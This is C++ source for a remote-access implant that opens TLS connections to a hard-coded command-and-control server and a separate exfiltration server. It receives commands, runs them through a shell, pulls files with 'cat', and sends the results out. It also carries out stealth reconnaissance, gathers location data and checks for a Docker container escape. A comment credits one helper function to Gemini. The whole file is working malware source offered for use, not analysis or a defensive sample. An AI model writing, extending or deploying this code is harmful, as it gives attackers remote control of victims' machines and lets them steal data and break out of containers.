// 

#include <cstdlib>
#include <cstddef>
#include <cstdio>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <memory>
#include <array>
#include <unistd.h>          // for chdir, getcwd

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// Full stealth reconnaissance module
#include "recon.h"
#include "docker_enum.h"

#ifndef C2_IP
#define C2_IP "10.37.1.249"
#endif
#ifndef C2_PORT
#define C2_PORT 8888
#endif
#ifndef EXFIL_IP
#define EXFIL_IP "10.37.1.249"
#endif
#ifndef EXFIL_PORT
#define EXFIL_PORT 8889
#endif

// Maximum chars to echo back to C2 terminal
static const size_t C2_PREVIEW_LEN = 500;

// Global working directory (initialised to /tmp at startup)
static std::string current_dir = "/tmp";

std::string decrypt(char* buf, size_t bytes) {
    buf[bytes] = '\0';
    std::string message(buf);
    return message;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string r;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if(!pipe) { return "ERR, pipe failed"; }
    while(fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        r += buffer.data();
    }
    return r;
}

/* Made by Gemini */
bool send_all_ssl(SSL* ssl, const char* data, int total_size) {
    int bytes_sent = 0;
    while (bytes_sent < total_size) {
        // Try to send the remaining slice of the buffer
        int result = SSL_write(ssl, data + bytes_sent, total_size - bytes_sent);
        
        if (result <= 0) {
            int err = SSL_get_error(ssl, result);
            // Handle cases where the socket isn't ready or was closed
            if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ) {
                continue; // Retry if it's a temporary block
            }
            // Real error occurred
            return false;
        }
        bytes_sent += result;
    }
    return true;
}

void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
    std::istringstream iss(msg);
    std::string keyword, id, data;
    if (!(iss >> keyword) || !(iss >> id)) return;
    std::getline(iss, data);
    if (!data.empty() && data[0] == ' ') data.erase(0, 1);

    std::string c2_response;
    std::string exfil_data;
    char type = 'T';

    if (keyword == "HELO") {
        c2_response = "HELLO " + id;
        exfil_data = "HELO from implant\n";
    } else if (keyword == "EXIT") {
        throw 1;
    } else if (keyword == "CMD") {
        // Check if it's a 'cd' command to update working directory
        if (data.rfind("cd ", 0) == 0) {   // starts with "cd "
            std::string new_dir = data.substr(3);
            if (new_dir.empty()) {
                c2_response = "Usage: cd <directory>";
            } else {
                if (chdir(new_dir.c_str()) == 0) {
                    // Update the cached working directory
                    char pathbuf[512];
                    if (getcwd(pathbuf, sizeof(pathbuf)))
                        current_dir = pathbuf;
                    else
                        current_dir = new_dir;  // fallback
                    c2_response = "Changed directory to " + current_dir;
                } else {
                    c2_response = "cd: " + std::string(strerror(errno));
                }
            }
            exfil_data = "CMD: " + data + "\n" + c2_response + "\n---\n";
        } else {
            // Build command that first changes to current_dir, then runs the user's command
            std::string full_cmd = "cd \"" + current_dir + "\" && (" + data + ")";
            std::string output = exec(full_cmd.c_str());
            if (output.length() > C2_PREVIEW_LEN) {
                c2_response = output.substr(0, C2_PREVIEW_LEN) + "\n... [full output in exfil]";
            } else {
                c2_response = output.empty() ? "CMD OK" : output;
            }
            exfil_data = "CMD: " + data + "\n" + output + "\n---\n";
        }
    } else if (keyword == "RECON") {
        std::string recon_report = perform_full_recon();
        if (recon_report.length() > C2_PREVIEW_LEN) {
            c2_response = recon_report.substr(0, C2_PREVIEW_LEN) + "\n... [full report in exfil]";
        } else {
            c2_response = recon_report;
        }
        exfil_data = "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n";
    } else if (keyword == "IP_REPORT") {
        std::string loc_report = collect_ip_info();
        if (loc_report.length() > C2_PREVIEW_LEN) {
            c2_response = loc_report.substr(0, C2_PREVIEW_LEN) + "\n... [full report in exfil]";
        } else {
            c2_response = loc_report;
        }
        exfil_data = "=== FULL LOCATION REPORT ===\n" + loc_report + "\n=== END ===\n";
    } else if (keyword == "ESCAPE") {
        DetectionResult result = run_environment_checks();
        c2_response = result.can_escape ? "ESCAPE_OK " + id : (result.is_docker ? "ESCAPE_FAIL " + id : "NOT_DOCKER " + id);
        
        std::ostringstream oss;
        oss << "=== CONTAINER ESCAPE REPORT ===\n";
        oss << "Is Docker: " << (result.is_docker ? "YES" : "NO") << "\n";
        oss << "Privileged: " << (result.is_privileged ? "YES" : "NO") << "\n";
        oss << "Escape Status: " << (result.can_escape ? "SUCCESS" : "FAILED/NA") << "\n";
        oss << "Details: " << result.details << "\n";
        oss << "=== END ===\n";
        exfil_data = oss.str();
    } else if (keyword == "GET") {
        type = 'F';
        std::string full_cmd = "cat " + data;
        exfil_data = exec(full_cmd.c_str());
    } else {
        c2_response = "ERR " + id;
    }
    
    if (exfil_ssl && !exfil_data.empty()) {
        uint32_t payload_size = htonl(static_cast<uint32_t>(exfil_data.size()));

        std::vector<char> buffer;
        buffer.reserve(5 + exfil_data.size());
        buffer.push_back(type);

        char* size_bytes = reinterpret_cast<char*>(&payload_size);
        buffer.insert(buffer.end(), size_bytes, size_bytes + 4);
        buffer.insert(buffer.end(), exfil_data.begin(), exfil_data.end());

        //send_all_ssl(exfil_ssl, buffer.data(), buffer.size());

        SSL_write(exfil_ssl, buffer.data(), buffer.size());
    }
}

SSL_CTX* createSSLContext() {
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return nullptr;
    }
    if (SSL_CTX_load_verify_locations(ctx, "/tmp/index.html", nullptr) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return nullptr;
    }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, nullptr);
    return ctx;
}

SSL* connectTLS(SSL_CTX* ctx, int sock, const char* hostname) {
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_set_tlsext_host_name(ssl, hostname);
    if (SSL_connect(ssl) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        return nullptr;
    }
    return ssl;
}

int makeSocket(const char* ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

int main() {
    SSL_CTX* ctx = createSSLContext();
    if (!ctx) return 1;

    int sock1 = makeSocket(C2_IP, C2_PORT);
    if (sock1 < 0) { SSL_CTX_free(ctx); return 1; }
    SSL* ssl1 = connectTLS(ctx, sock1, C2_IP);
    if (!ssl1) { close(sock1); SSL_CTX_free(ctx); return 1; }

    int sock2 = makeSocket(EXFIL_IP, EXFIL_PORT);
    if (sock2 < 0) { SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }
    SSL* ssl2 = connectTLS(ctx, sock2, EXFIL_IP);
    if (!ssl2) { close(sock2); SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }

    char buf[1024];
    while (true) {
        int bytes = SSL_read(ssl1, buf, sizeof(buf) - 1);
        if (bytes <= 0) break;
        try {
            handleMessage(decrypt(buf, bytes), ssl1, ssl2);
        } catch (...) {
            break;
        }
    }

    SSL_shutdown(ssl1); SSL_free(ssl1); close(sock1);
    SSL_shutdown(ssl2); SSL_free(ssl2); close(sock2);
    SSL_CTX_free(ctx);
    return EXIT_SUCCESS;
}
